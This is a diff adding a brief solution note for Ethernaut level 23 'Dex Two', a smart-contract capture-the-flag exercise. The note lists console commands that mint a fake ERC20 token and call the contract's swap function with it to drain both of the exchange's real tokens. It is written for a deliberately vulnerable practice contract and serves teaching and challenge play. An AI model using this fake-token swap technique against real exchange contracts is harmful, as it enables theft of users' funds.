@@ -1,0 +1,9 @@
+open console
+Step1:- Mint your own ERC20 Token (Ex:- SRS Token)
+Step1:- Transfer 100 SRS Token to Dex2 contract from etherscan
+Step1:- Approve SRS Token for Dex2 contract address
+Step1:- await contract.approve(contract.address, 500) 
+Step1:- await contract.swap("0xD23cDB8a28411E64668A5297400ceb6Bcb64a9A3", await contract.token1(), 100)
+Step1:- await contract.swap("0xD23cDB8a28411E64668A5297400ceb6Bcb64a9A3", await contract.token2(), 200) 
+Submit<-||
+Ref:- https://dev.to/nvn/ethernaut-hacks-level-23-dex-two-4424
